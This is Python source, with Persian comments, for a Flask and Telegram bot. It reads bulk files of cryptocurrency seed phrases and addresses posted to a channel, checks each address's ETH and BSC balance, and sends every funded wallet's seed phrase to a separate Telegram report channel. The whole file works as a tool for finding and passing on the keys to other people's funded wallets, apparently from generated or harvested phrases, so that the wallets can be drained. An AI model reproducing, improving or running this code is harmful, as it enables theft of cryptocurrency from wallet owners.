import os
import re
import logging
import asyncio
import queue
import threading
from concurrent.futures import ThreadPoolExecutor
from flask import Flask, request
from telegram import Bot, Update
from telegram.request import HTTPXRequest
from web3 import Web3

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(message)s')

BOT_TOKEN = os.environ.get("BOT_TOKEN")
SOURCE_CHANNEL = -1003533610913
REPORT_CHANNEL = -1004337084974

NETWORKS = {
    'ETH': 'https://eth.llamarpc.com',
    'BSC': 'https://bsc-dataseed.binance.org/',
}

request_config = HTTPXRequest(
    connection_pool_size=50,
    pool_timeout=60.0,
    connect_timeout=30.0,
    read_timeout=60.0
)
bot = Bot(token=BOT_TOKEN, request=request_config)

app = Flask(__name__)

file_queue = queue.Queue()

def get_wallet_total(address: str) -> dict:
    totals = {'ETH': 0.0, 'BSC': 0.0}
    for net, rpc in NETWORKS.items():
        try:
            w3 = Web3(Web3.HTTPProvider(rpc, request_kwargs={'timeout': 5}))
            checksum = Web3.to_checksum_address(address.strip())
            balance = w3.eth.get_balance(checksum)
            totals[net] = float(w3.from_wei(balance, 'ether'))
        except:
            continue
    return totals

async def process_one_file(doc):
    try:
        logging.info(f"=== Start: {doc.file_name} ===")

        file = await bot.get_file(doc.file_id)
        content = await file.download_as_bytearray()
        text = content.decode('utf-8', errors='ignore')

        # استخراج جفت‌های Phrase + Addr
        pattern = r"Phrase:\s*(.+?)\s*\|\s*Addr:\s*(0x[a-fA-F0-9]{40})"
        matches = re.findall(pattern, text, re.IGNORECASE)

        logging.info(f"Found {len(matches)} wallet entries")

        if not matches:
            await bot.send_message(chat_id=REPORT_CHANNEL, text=f"❌ در فایل `{doc.file_name}` موردی پیدا نشد.")
            return

        # استخراج شناسه تست
        test_id_match = re.search(r"تعداد تست[:\s]*(\d+)", text)
        test_id = test_id_match.group(1) if test_id_match else "نامشخص"

        file_totals = {'ETH': 0.0, 'BSC': 0.0}
        rich_wallets = []

        # اسکن موجودی‌ها
        with ThreadPoolExecutor(max_workers=8) as executor:
            loop = asyncio.get_running_loop()
            addresses = [addr for _, addr in matches]
            tasks = [loop.run_in_executor(executor, get_wallet_total, addr) for addr in addresses]
            results = await asyncio.gather(*tasks)

        for (phrase, addr), res in zip(matches, results):
            total = res['ETH'] + res['BSC']
            file_totals['ETH'] += res['ETH']
            file_totals['BSC'] += res['BSC']

            if total > 0.00001:
                rich_wallets.append({
                    'phrase': phrase.strip(),
                    'address': addr,
                    'balances': res
                })

        # گزارش کلی
        report = (
            f"📊 **گزارش فایل**\n"
            f"📄 فایل: `{doc.file_name}`\n"
            f"🔢 شناسه تست: `{test_id}`\n"
            f"🔢 تعداد ولت: `{len(matches)}`\n"
            f"──────────────────\n"
            f"**مجموع موجودی‌ها:**\n"
            f"🔹 ETH: `{file_totals['ETH']:.6f}`\n"
            f"🔹 BSC: `{file_totals['BSC']:.6f}`\n"
        )
        await bot.send_message(chat_id=REPORT_CHANNEL, text=report, parse_mode='Markdown')

        # گزارش ولت‌های دارای موجودی
        if rich_wallets:
            await bot.send_message(
                chat_id=REPORT_CHANNEL,
                text=f"💰 **{len(rich_wallets)} ولت دارای موجودی پیدا شد:**"
            )

            for wallet in rich_wallets:
                msg = (
                    f"`{wallet['address']}`\n"
                    f"🔑 Seed:\n`{wallet['phrase']}`\n"
                )
                if wallet['balances']['ETH'] > 0:
                    msg += f"• ETH: `{wallet['balances']['ETH']:.6f}`\n"
                if wallet['balances']['BSC'] > 0:
                    msg += f"• BSC: `{wallet['balances']['BSC']:.6f}`\n"

                await bot.send_message(chat_id=REPORT_CHANNEL, text=msg, parse_mode='Markdown')
                await asyncio.sleep(0.4)

        logging.info(f"=== Finished: {doc.file_name} | Rich wallets: {len(rich_wallets)} ===")

    except Exception as e:
        logging.error(f"Error: {e}", exc_info=True)
        try:
            await bot.send_message(chat_id=REPORT_CHANNEL, text=f"❌ خطا در `{doc.file_name}`:\n`{str(e)[:200]}`")
        except:
            pass

def worker():
    while True:
        doc = file_queue.get()
        try:
            asyncio.run(process_one_file(doc))
        except Exception as e:
            logging.error(f"Worker error: {e}")
        finally:
            file_queue.task_done()

threading.Thread(target=worker, daemon=True).start()

@app.route('/webhook', methods=['POST'])
def webhook():
    data = request.get_json(force=True)
    update = Update.de_json(data, bot)

    if update.channel_post and update.channel_post.document:
        if update.channel_post.chat.id == SOURCE_CHANNEL:
            file_queue.put(update.channel_post.document)
            logging.info(f"Added to queue: {update.channel_post.document.file_name} | Size: {file_queue.qsize()}")

    return "OK"

@app.route('/')
def health():
    return f"Bot running | Queue: {file_queue.qsize()}"
